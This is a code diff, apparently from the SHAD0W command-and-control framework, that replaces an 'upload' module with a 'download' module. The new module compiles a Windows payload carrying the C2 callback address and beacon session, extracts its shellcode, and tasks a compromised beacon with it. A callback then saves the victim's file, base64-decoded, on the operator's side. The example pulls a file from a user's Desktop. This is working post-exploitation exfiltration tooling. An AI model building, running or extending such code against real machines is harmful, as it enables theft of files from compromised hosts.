@@ -5,6 +5,7 @@
 import os
 import base64
 import argparse
+import traceback
 
 from lib import buildtools
 
@@ -13,9 +14,8 @@ EXEC_ID = 0x3000
 ERROR = False
 error_list = ""
 
-# file name & data to upload
-FILE_TO_UPLOAD = ""
-FILE_DATA      = ""
+# name of the file to download
+FILE_TO_DOWLOAD = ""
 
 # let argparse error and exit nice
 def error(message):
@@ -27,22 +27,26 @@ def exit(status=0, message=None):
     if message != None: print(message)
     return
 
-def upload_callback(shad0w, data):
-    global FILE_TO_UPLOAD, FILE_DATA
+def download_callback(shad0w, data):
+    global FILE_TO_DOWLOAD
 
-    shad0w.debug.good(f"Uploading '{FILE_TO_UPLOAD}' ({len(FILE_DATA)} bytes)")
+    # change to the dir of the folder mapped to the users current dir
+    os.chdir("/root/shad0w/.bridge")
 
-    return base64.b64encode(FILE_DATA)
+    FILE_TO_DOWLOAD = ''.join(FILE_TO_DOWLOAD)
+    with open(FILE_TO_DOWLOAD, 'wb') as file:
+        file.write(base64.b64decode(data))
+    
+    # change the dir to our root
+    os.chdir("/root/shad0w/")
+
+    shad0w.debug.good(f"Downloading '{FILE_TO_DOWLOAD}' ({len(data)} bytes)")
+
+    return ""
 
 
 def main(shad0w, args):
-    global FILE_TO_UPLOAD, FILE_DATA
-
-    # used to determine if we are writing to a path or not
-    abs_path = "TRUE"
-
-    # save the raw args
-    raw_args = args
+    global FILE_TO_DOWLOAD
     
     # check we actually have a beacon
     if shad0w.current_beacon is None:
@@ -54,11 +58,11 @@ def main(shad0w, args):
 
 Examples:
 
-upload -f fake_secret_plans.txt -d C:\\Users\\thejoker\\Desktop\\batmans_secret_plans.txt
+download C:\\Users\\thejoker\\Desktop\\evil_plans.txt
 """
 
     # init the parser
-    parse = argparse.ArgumentParser(prog='upload',
+    parse = argparse.ArgumentParser(prog='download',
                                 formatter_class=argparse.RawDescriptionHelpFormatter,
                                 epilog=usage_examples)
     
@@ -67,8 +71,7 @@ upload -f fake_secret_plans.txt -d C:\\Users\\thejoker\\Desktop\\batmans_secret_
     parse.error = error
 
     # setup the args
-    parse.add_argument("-f", "--file", required=True, help="Name of the file you want to upload")
-    parse.add_argument("-d", "--destination", nargs="*", help="Destination where the uploaded file should be stored")
+    parse.add_argument("file", nargs='*', help="File you want to download")
 
     # make sure we dont die from weird args
     try:
@@ -82,32 +85,23 @@ upload -f fake_secret_plans.txt -d C:\\Users\\thejoker\\Desktop\\batmans_secret_
         parse.print_help()
         return
 
-    # make the destination file name
-    if args.destination == None:
-        args.destination = os.path.basename(args.file)
-        abs_path = "FALSE"
-
     # save the current dir
     shad0w_cwd = os.getcwd()
 
     # change to the dir of the folder mapped to the users current dir
     os.chdir("/root/shad0w/.bridge")
-
-    # read the data from the file
-    try:
-        with open(args.file, 'rb') as file:
-            FILE_DATA = file.read()
-    except:
-        shad0w.debug.error(f"File {args.file} does not exist")
     
     # make this variable global so the call back can access it 
-    FILE_TO_UPLOAD = args.file
+    FILE_TO_DOWLOAD = args.file
     
     # change back to our dir
     os.chdir(shad0w_cwd)
 
+    # clean up the file name
+    read_file = ' '.join(args.file).replace('\\', "\\\\").replace('"', '')
+
     # clone all the source files
-    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/upload/", builddir="/root/shad0w/modules/windows/upload/build")
+    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/download/", builddir="/root/shad0w/modules/windows/download/build")
 
     # set the correct settings
     template = """#define _C2_CALLBACK_ADDRESS L"%s"
@@ -118,17 +112,16 @@ upload -f fake_secret_plans.txt -d C:\\Users\\thejoker\\Desktop\\batmans_secret_
 #define _HEADER_LEN -1
 #define SESSION_ID "%s"
 #define DO_CALLBACK 0x4000
-#define FILENAME "%s"
-#define ABS_PATH %s""" % (shad0w.endpoint, shad0w.addr[1], shad0w.current_beacon, args.destination, abs_path)
+#define FILENAME "%s" """ % (shad0w.endpoint, shad0w.addr[1], shad0w.current_beacon, read_file)
 
-    buildtools.update_settings_file(None, custom_template=template, custom_path="/root/shad0w/modules/windows/upload/build/settings.h")
+    buildtools.update_settings_file(None, custom_template=template, custom_path="/root/shad0w/modules/windows/download/build/settings.h")
 
     # compile the module
-    buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/upload/build", modlocation="/root/shad0w/modules/windows/upload/module.exe")
+    buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/download/build", modlocation="/root/shad0w/modules/windows/download/module.exe")
 
     # get the shellcode from the module
-    rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/upload/module.exe", want_base64=True)
+    rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/download/module.exe", want_base64=True)
 
     # set a task for the current beacon to do
-    shad0w.beacons[shad0w.current_beacon]["callback"] = upload_callback
+    shad0w.beacons[shad0w.current_beacon]["callback"] = download_callback
     shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)
